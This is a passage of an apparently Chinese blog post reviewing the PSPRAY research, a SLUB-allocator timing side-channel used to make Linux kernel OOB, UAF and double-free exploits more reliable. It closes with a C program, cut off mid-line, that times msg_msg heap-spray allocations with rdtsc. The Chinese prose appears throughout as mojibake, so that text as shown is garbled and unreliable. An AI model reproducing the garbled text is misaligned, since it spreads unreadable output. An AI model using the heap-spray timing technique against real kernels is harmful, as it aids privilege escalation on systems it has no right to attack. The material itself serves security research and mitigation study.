ä¿¡æ¯çš„ç¼ºå¤±ï¼Œæœ¬æ–‡æ‰¾åˆ°äº†ä¸€ç§èƒ½å¤Ÿè·å– slab çš„éƒ¨åˆ†åˆ†é…ä¿¡æ¯çš„æ—¶åºä¾§ä¿¡é“æ–¹æ³•ï¼Œä»è€Œæé«˜åˆ©ç”¨æˆåŠŸæ¦‚ç‡</p><h2 id="4-1-Timing-Side-Channel-on-SLUB-allocator"><a href="#4-1-Timing-Side-Channel-on-SLUB-allocator" class="headerlink" title="4.1 Timing Side-Channel on SLUB allocator"></a>4.1 Timing Side-Channel on SLUB allocator</h2><p>å¦‚å›¾ 2.1 æ‰€ç¤ºï¼ŒSLUB æœ‰äº”æ¡ä¸åŒæ·±åº¦çš„åˆ†é…è·¯å¾„ä»¥ä¼˜åŒ–æ€§èƒ½è¡¨ç°ï¼Œä¸ºäº†å¼„æ¸…ä¸åŒè·¯å¾„çš„è¡¨ç°ï¼Œä½œè€…é€šè¿‡ <code>msgsnd()</code> ç³»ç»Ÿè°ƒç”¨ï¼ˆå¦‚å›¾ 4.3 æ‰€ç¤ºå…¶ä»…åˆ†é…ä¸€ä¸ªå¯¹è±¡ï¼‰æµ‹è¯•äº†ä» <code>kmalloc()</code> çš„æ ¸å¿ƒå‡½æ•° <code>slab_alloc_node()</code> çš„å¼€å§‹åˆ°ç»“å°¾çš„æ€§èƒ½ï¼Œç»è¿‡å¤šè½®æµ‹è¯•å‘ç° <code>slow-path</code> ä¸å…¶ä»–è·¯å¾„ç›¸æ¯”å­˜åœ¨æ˜æ˜¾çš„è¡¨ç°å·®è·ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡æµ‹é‡åˆ†é…æ—¶é—´å¾—çŸ¥å†…å­˜åˆ†é…æ‰€ç»å†çš„è·¯å¾„</p><h2 id="4-2-Inferring-Allocation-Status"><a href="#4-2-Inferring-Allocation-Status" class="headerlink" title="4.2 Inferring Allocation Status"></a>4.2 Inferring Allocation Status</h2><p> <code>slow-path</code> ä»¥å¤–çš„åˆ†é…è·¯å¾„çš„åˆ†é…çŠ¶æ€éƒ½æ˜¯éš¾ä»¥ç¡®å®šçš„ï¼Œä½† <code>slow-path</code> çš„è¡Œä¸ºä¸å…¶ä»–è·¯å¾„ä¸åŒï¼Œæ­¤æ—¶å†…æ ¸ä¼šä» buddy system åˆ†é…ä¸€å¼ æ–° slabï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“å½“å‰çš„ slab åˆšè¢«åˆ†é…ä¸”ä»…åˆ†é…äº†ä¸€ä¸ªå¯¹è±¡</p><h2 id="4-3-Proof-Of-Concept"><a href="#4-3-Proof-Of-Concept" class="headerlink" title="4.3 Proof-Of-Concept"></a>4.3 Proof-Of-Concept</h2><h4 id="Finding-an-adequate-system-call"><a href="#Finding-an-adequate-system-call" class="headerlink" title="Finding an adequate system call"></a>Finding an adequate system call</h4><p>ä¸ºäº†ä½¿ç”¨æ—¶åºä¾§ä¿¡é“ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶çš„ç³»ç»Ÿè°ƒç”¨ï¼š</p><ul><li>æ™®é€šç”¨æˆ·æƒé™å¯ç”¨</li><li>ä»…åˆ†é…ä¸€ä¸ªå¯¹è±¡</li><li>é™¤äº†å¯¹è±¡åˆ†é…ä»¥å¤–çš„æ€§èƒ½å¼€é”€è¦å°</li></ul><p>ä½œè€…ä¿®æ”¹äº† kernel ä»¥åœ¨ç³»ç»Ÿè°ƒç”¨ä»…åˆ†é…ä¸€ä¸ª <code>kmalloc-xx</code> ä¸­çš„å¯¹è±¡æ—¶ panicï¼Œå¹¶ä½¿ç”¨ Syzkaller è¿›è¡Œæµ‹è¯•ï¼Œæ‰¾åˆ°äº†å¦‚è¡¨ A.1 æ‰€ç¤ºçš„ 23 ä¸ªæ»¡è¶³è¯¥æ¡ä»¶çš„ç³»ç»Ÿè°ƒç”¨ï¼Œè¿™äº›ä»ç”¨æˆ·ç©ºé—´æ‹·è´æ•°æ®çš„ç³»ç»Ÿè°ƒç”¨æ¶µç›–äº† <code>kmalloc-32</code> åˆ° <code>kmalloc-8192</code>ï¼ŒåŒæ—¶å…¶å†…å­˜åˆ†é…ä»¥å¤–çš„ä»£ç ä¸ä¼šè¿‡äºå½±å“å†…å­˜</p><p><img src="https://s2.loli.net/2023/09/15/5EYjRperomGIhwB.png"></p><h4 id="Experiment"><a href="#Experiment" class="headerlink" title="Experiment"></a>Experiment</h4><p>ç®€å•æ¥è¯´å°±æ˜¯ç”¨ <code>msgsnd()</code> åšäº†å †å–· 1000 æ¬¡çš„æµ‹è¯•å¹¶æµ‹é‡å…¶è¡¨ç°</p><h4 id="Experiment-Results"><a href="#Experiment-Results" class="headerlink" title="Experiment Results"></a>Experiment Results</h4><p>å›¾ 9 ä¸ºä½¿ç”¨ <code>msgsnd()</code> è¿›è¡Œæµ‹è¯•çš„ç»“æœï¼Œå¯çŸ¥ <code>fast-path</code> ä¸ <code>medium-path</code> é—´éš¾ä»¥åšå‡ºåŒºåˆ†ï¼ˆéƒ½è¦æ¶ˆè€— 10000 å·¦å³çš„ CPU å‘¨æœŸï¼‰ï¼Œä½† <code>slow-path</code> å¯ä»¥è¢«åŒºåˆ†ï¼ˆè¦æ¶ˆè€— 35000 å·¦å³çš„ CPU å‘¨æœŸï¼‰</p><p><img src="https://s2.loli.net/2023/09/15/DhbYf6i1sMHFeLR.png"></p><h1 id="0x05-Application-of-PSPRAY"><a href="#0x05-Application-of-PSPRAY" class="headerlink" title="0x05. Application of PSPRAY"></a>0x05. Application of PSPRAY</h1><h2 id="5-1-OOB-Exploitation"><a href="#5-1-OOB-Exploitation" class="headerlink" title="5.1 OOB Exploitation"></a>5.1 OOB Exploitation</h2><p>å›¾ 10 å±•ç¤ºäº†åœ¨å¼€å¯ free list randomization çš„æƒ…å†µä¸‹å¯¹ OOB æ¼æ´åº”ç”¨ PSPRAY çš„è¿‡ç¨‹ï¼š</p><ul><li>ä½¿ç”¨ PSPRAY ç¡®å®š <code>slow-path</code> æ˜¯å¦è¢«æ‰§è¡Œï¼Œæ­¤æ—¶ slab <code>B</code> è¢«åˆ›å»ºä¸”å·²åˆ†é…äº†ä¸€ä¸ªç»“æ„ä½“</li><li>æ¥ä¸‹æ¥æˆ‘ä»¬å †å–· <code>N-1</code> ä¸ªå¯¹è±¡å°†å…¶å®Œå…¨åˆ†é…ï¼ˆå‡è®¾ä¸€å¼  slab ä¸Šæœ‰ <code>N</code> ä¸ªå¯¹è±¡ï¼‰</li><li>æˆ‘ä»¬æ¥ä¸‹æ¥çš„åˆ†é…åˆä¼šåˆ†é…ä¸€å¼ æ–°çš„ slab <code>C</code> ï¼Œåˆ†é… <code>N - 1</code> ä¸ª victim å¯¹è±¡</li><li>åˆ†é…æ¼æ´å¯¹è±¡ï¼Œæ­¤æ—¶è‹¥æ¼æ´å¯¹è±¡ä¸ä¸º slab ä¸Šåœ°å€æœ€é«˜å¤„å¯¹è±¡ï¼Œåˆ™ OOB å°†æˆåŠŸ</li></ul><p><img src="https://s2.loli.net/2023/09/15/pBelmXzb6I1fuPH.png"></p><p>åˆ©ç”¨æˆåŠŸç‡ä¸ºï¼š<br>$$<br>P_{OOB}^{PSPRAY}&#x3D;\frac{N-1}{N}<br>$$</p><h2 id="5-2-UAF-and-DF-Exploitation"><a href="#5-2-UAF-and-DF-Exploitation" class="headerlink" title="5.2 UAF and DF Exploitation"></a>5.2 UAF and DF Exploitation</h2><p>å›¾ 11 å±•ç¤ºäº†å¦‚ä½•åœ¨ UAF ä¸ DF æ¼æ´ä¸Šåˆ©ç”¨ PSPRAYï¼š</p><ul><li>é¦–å…ˆç”¨ PSPRAY æ‰¾åˆ°æ–° slab è¢«åˆ†é…çš„æ—¶é—´ç‚¹ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿çŸ¥é“ä¸€å¼ å·²åˆ†é…ä¸€ä¸ªå¯¹è±¡çš„ slab è¢«åˆ›å»ºäº†</li><li>ç„¶åæ­£å¸¸åˆ©ç”¨ UAF&#x2F;DF</li></ul><blockquote><p>ğŸ‘´å¯»æ€å¥½åƒæ²¡å•¥å¯è®²çš„</p></blockquote><p><img src="https://s2.loli.net/2023/09/15/wLO8TNY4Q1e7zn5.png"></p><p>åˆ©ç”¨æˆåŠŸç‡ä¸ºï¼š</p><p><img src="https://s2.loli.net/2023/09/16/V6jo4yT2OSLMBAk.png"></p><h1 id="0x06-Attack-Evaluation"><a href="#0x06-Attack-Evaluation" class="headerlink" title="0x06. Attack Evaluation"></a>0x06. Attack Evaluation</h1><p>è®ºæ–‡é‡Œè¿™ä¸€èŠ‚ä¸»è¦æ˜¯åšæµ‹è¯•</p><h2 id="6-1-Synthetic-Vulnerability"><a href="#6-1-Synthetic-Vulnerability" class="headerlink" title="6.1 Synthetic Vulnerability"></a>6.1 Synthetic Vulnerability</h2><p>ä¸»è¦æ˜¯ä½œè€…è‡ªå·±å¼€å‘æ¼æ´è‡ªå·±æ‰“ï¼Œæµ‹è¯•ç”¨çš„ OOB æ´é•¿è¿™ä¸ªæ ·å­ï¼š</p><p><img src="https://s2.loli.net/2023/09/15/CAsp71oLIZPBykf.png"></p><p>UAF æ´é•¿è¿™ä¸ªæ ·å­ï¼š</p><p><img src="https://s2.loli.net/2023/09/15/kW8aPNTIxOEsBnr.png"></p><p>ç»“æœå¦‚è¡¨ 1 æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2023/09/15/DpNMjv3GAdstokR.png"></p><h2 id="6-2-Real-World-Vulnerability"><a href="#6-2-Real-World-Vulnerability" class="headerlink" title="6.2 Real-World Vulnerability"></a>6.2 Real-World Vulnerability</h2><p>æ‰“äº†ä¸€äº›çœŸå®çš„æ´ï¼Œç»“æœå¦‚è¡¨ 2 æ‰€ç¤ºï¼Œå’Œå…¬å¼€çš„ exp ç›¸æ¯”åˆ©ç”¨æˆåŠŸç‡æå‡æ˜æ˜¾ï¼š</p><p><img src="https://s2.loli.net/2023/09/15/rGhvEOywRWi6S1B.png"></p><h1 id="0x07-Mitigation"><a href="#0x07-Mitigation" class="headerlink" title="0x07. Mitigation"></a>0x07. Mitigation</h1><p>PSPRAY ä¸»è¦æœ‰ä¸¤ä¸ªç‚¹ï¼š</p><ul><li><code>slow-path</code> çš„åˆ†é…é€Ÿåº¦å·®å¼‚æ˜æ˜¾</li><li><code>slow-path</code> çš„å‡ºç°æ„å‘³ç€æ­¤æ—¶çš„ freelist ä¸ºç©º</li></ul><p>ä½œè€…è®¤ä¸ºé’ˆå¯¹ PSPRAY çš„é˜²å¾¡æ‰‹æ®µä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ä¸ªï¼š</p><ul><li>è®©æ‰€æœ‰çš„åˆ†é…è·¯å¾„éƒ½æœ‰ç€ç›¸ä¼¼çš„æ€§èƒ½è¡¨ç°ï¼ˆé’ˆå¯¹ç¬¬ä¸€ä¸ªç‚¹ï¼‰</li><li>éšæœºåŒ– <code>slow-path</code> åˆ†é…ä¸Šä¸‹æ–‡ï¼ˆé’ˆå¯¹ç¬¬äºŒä¸ªç‚¹ï¼‰</li></ul><h3 id="Mitigation-1-Uniform-Allocation-Performance"><a href="#Mitigation-1-Uniform-Allocation-Performance" class="headerlink" title="Mitigation #1. Uniform Allocation Performance."></a>Mitigation #1. Uniform Allocation Performance.</h3><p>åŸºæœ¬æ²¡å•¥æ´»å¯ä»¥æ•´</p><h3 id="Mitigation-2-Randomized-Slow-path-Allocation-Context"><a href="#Mitigation-2-Randomized-Slow-path-Allocation-Context" class="headerlink" title="Mitigation #2. Randomized Slow-path Allocation Context."></a>Mitigation #2. Randomized Slow-path Allocation Context.</h3><p>ä¸»è¦æ˜¯è®©åˆ†é…å¹¶ä¸æ˜¯åœ¨ freelist ä¸ºç©ºæ—¶æ‰è¿›å…¥åˆ° <code>slow-path</code> ï¼Œè¿™é‡Œè®¾è®¡äº†ä¸€ä¸ªç®€æ˜“çš„ç®—æ³•å°±æ˜¯è®© slab ä¸Šå¯¹è±¡çš„ idx ä¸ä¸€ä¸ªå¸¸é‡ç›¸ç­‰ä¸” CPU partial ä¸ºç©ºæ—¶è¿›åˆ°ä¸€ä¸ªæ–°çš„ slow pathï¼Œä»è€Œä½¿å¾—è¿™ä¸¤ä¸ª slow path æ— æ³•è¢«åŒºåˆ†</p><p><img src="https://s2.loli.net/2023/09/15/EnYdvIbhfp4FkUS.png"></p><p>å›¾ 12 æ˜¾ç¤ºäº†è¿™ç§æ–¹æ³•çš„åŸºæœ¬åŸç†ï¼š</p><p><img src="https://s2.loli.net/2023/09/15/yNGZAbSz7qaJfrs.png"></p><h1 id="0x08-Discussion"><a href="#0x08-Discussion" class="headerlink" title="0x08. Discussion"></a>0x08. Discussion</h1><h2 id="8-1-The-Noise"><a href="#8-1-The-Noise" class="headerlink" title="8.1 The Noise"></a>8.1 The Noise</h2><p>ç”±è°ƒåº¦å™¨å¸¦æ¥çš„å™ªéŸ³ä»å¯ä»¥é˜»ç¢åˆ©ç”¨ï¼Œä¸»è¦æ¥è‡ªä¸¤ç§æœºåˆ¶ï¼šCPU è¿ç§»ä¸ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼›è¿™æ ·çš„å™ªå£°å¯ä»¥åœ¨åˆ†é…&#x2F;é‡Šæ”¾ä¸€ä¸ªç›®æ ‡å¯¹è±¡æˆ–æ¼æ´å¯¹è±¡æ—¶å‡ºç°</p><blockquote><p>ğŸ‘´æ„Ÿè§‰ç”¨ <code>sched_setaffinity()</code> ç»‘æ ¸å¯ä»¥å®Œç¾è§£å†³è¿™ä¸ªé—®é¢˜</p></blockquote><h2 id="8-2-The-Other-OSes"><a href="#8-2-The-Other-OSes" class="headerlink" title="8.2 The Other OSes"></a>8.2 The Other OSes</h2><p>å…¶ä»–çš„ OSes ä¹Ÿå¯ä»¥é‡‡ç”¨ PSPRAY æ–¹æ³•è¿›è¡Œåˆ©ç”¨ï¼Œå› ä¸ºå…¶é‡‡ç”¨ä¸ Linux ç›¸ç±»ä¼¼çš„å †åˆ†é…å™¨ï¼Œä½œè€…è¿™é‡Œæµ‹äº† FreeBSD å’Œ XNUï¼Œå…·ä½“çš„ç¬”è€…å°±ä¸è´´äº†ï¼šï¼‰</p><h1 id="0x09-Related-work"><a href="#0x09-Related-work" class="headerlink" title="0x09. Related work"></a>0x09. Related work</h1><h3 id="Kernel-Automated-Exploit-Generation"><a href="#Kernel-Automated-Exploit-Generation" class="headerlink" title="Kernel Automated Exploit Generation"></a>Kernel Automated Exploit Generation</h3><p>è‡ªåŠ¨åŒ–åˆ©ç”¨ï¼Œå¦‚ <a href="https://www.usenix.org/conference/usenixsecurity18/presentation/wu-wei">FUZE</a> ç”¨ fuzz å’Œç¬¦å·æ‰§è¡Œæ¥æ„é€ åˆ©ç”¨ï¼Œ<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/chen-weiteng">KOOBE</a> åˆ™é’ˆå¯¹ OOB ç±»æ¼æ´è¿›è¡Œè‡ªåŠ¨åŒ–åˆ©ç”¨ç”Ÿæˆ</p><blockquote><p>AEG è¯´å®è¯è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œå¯æƒœç¬”è€…ä¹‹å‰ç¡®å®æ²¡å’‹å…³æ³¨è¿‡ï¼šï¼‰</p></blockquote><h3 id="Kernel-Exploit-Techniques"><a href="#Kernel-Exploit-Techniques" class="headerlink" title="Kernel Exploit Techniques"></a>Kernel Exploit Techniques</h3><p>ç±»ä¼¼çš„åˆ©ç”¨æŠ€æœ¯ç›¸å…³çš„ç ”ç©¶æœ‰ ret2usrã€<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">ret2dir</a>ã€<a href="https://www.usenix.org/conference/usenixsecurity21/presentation/lee-yoochan">ExpRace</a>ã€<a href="https://dl.acm.org/doi/10.1145/3372297.3423353">Eloise</a> ç­‰</p><h3 id="Timing-Side-Channel-Attack-against-Kernel"><a href="#Timing-Side-Channel-Attack-against-Kernel" class="headerlink" title="Timing Side-Channel Attack against Kernel"></a>Timing Side-Channel Attack against Kernel</h3><p>å¯¹æ—¶åºä¾§ä¿¡é“æŠ€æœ¯çš„ç ”ç©¶ä¹Ÿå¾ˆå¤šï¼Œæ¯”å¦‚è¯´ <a href="https://ieeexplore.ieee.org/document/6547110">https://ieeexplore.ieee.org/document/6547110</a>ã€<a href="https://dl.acm.org/doi/10.1145/2976749.2978321">DRK</a>ã€<a href="https://www.usenix.org/conference/usenixsecurity18/presentation/lipp">Meltdown</a> ç­‰</p><h1 id="0x0A-Conclusion"><a href="#0x0A-Conclusion" class="headerlink" title="0x0A. Conclusion"></a>0x0A. Conclusion</h1><p>è¿™ç¯‡è®ºæ–‡åŸºäº SLUB åˆ†é…å™¨çš„æ„é€ æå‡ºäº†åä¸º $PSPRAY$ çš„æ—¶åºä¾§ä¿¡é“åˆ©ç”¨æ‰‹æ³•ï¼Œç»æµ‹è¯•èƒ½å¤Ÿæœ‰æ•ˆæå‡ OOB ä¸ UAF&#x2F;DF æ¼æ´çš„åˆ©ç”¨æˆåŠŸç‡</p><blockquote><p>ğŸ‘´å¯»æ€å¥½åƒä¹Ÿæ²¡å•¥å¥½è®²çš„</p></blockquote><h1 id="0xFF-Whatâ€™s-more"><a href="#0xFF-Whatâ€™s-more" class="headerlink" title="0xFF. Whatâ€™s more?"></a>0xFF. Whatâ€™s more?</h1><p>ç¬”è€…è‡ªå·±ä¹Ÿè¯•äº†ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ï¼Œå‘ç°<strong>slow-path çš„æ‰§è¡Œæ—¶é—´ç¡®å®å¯ä»¥ä¸å…¶ä»–è·¯å¾„è¿›è¡ŒåŒºåˆ†</strong>ï¼ˆåªéœ€è¦ç”¨ä¸€äº›ç»Ÿè®¡å­¦æ‰‹æ®µå°±å¥½ï¼‰ï¼Œä¸‹é¢æ˜¯ç¬”è€…è‡ªå·±æµ‹è¯•ç”¨çš„ä»£ç ï¼Œ<strong>åœ¨çœŸæœºæµ‹è¯•ä¸ QEMU è™šæ‹Ÿæœºæµ‹è¯•ä¸­ slow-path éƒ½è¡¨ç°å‡ºäº†æ˜¾è‘—çš„æ€§èƒ½å¼€é”€ï¼Œè¿™æ„å‘³ç€è¿™ç§æ–¹æ³•ç¡®ä¹å¯ä»¥è¢«åº”ç”¨äº CTF ä¸å®æˆ˜å½“ä¸­</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">del_msg_queue</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msqid_ds</span> <span class="hljs-title">ds_buf</span>;</span><br>    <span class="hljs-keyword">return</span> msgctl(msqid, IPC_RMID, &amp;ds_buf);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">rdtsc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> lo, hi;<br><br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;rdtsc&quot;</span> : <span class="hljs-string">&quot;=a&quot;</span> (lo), <span class="hljs-string">&quot;=d&quot;</span> (hi)</span><br><span class="hljs-params">    )</span>;<br><br>    <span class="hljs-keyword">return</span> (((<span class="hljs-type">uint64_t</span>) hi) &lt;&lt; <span class="hljs-number">32</span>) | lo;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> msqid[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">uint64_t</span> exec_time[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    bind_cpu(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        msqid[i] = get_msg_queue();<br>        <span class="hljs-keyword">if</span> (msqid[i] &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to get %d msg_queue!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to get msg_queue&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    *(<span class="hljs-type">size_t</span>*) buf = <span class="hljs-number">123456</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-type">uint64_t</span> begin, end;<br><br>        begin = rdtsc();<br>        <span class="hljs-keyword">if</span> (write_msg(msqid[i],buf,<span class="hljs-number">512</span>-<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg),<span class="hljs-number">0xdeadbeef</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to send %d msg!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to alloc msg_msg&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        end = rdtsc();<br><br>        exec_time[i] = end - begin;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (read_msg(msqid[i],buf,<span class="hljs-number">512</span>-<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg),<span class="hljs-number">0xdeadbeef</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to read %d msg!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to free msg_msg&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (del_msg_queue(msqid[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to delete %d msg_queue!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to free msg_queue&quot;</span>);<br>            <span 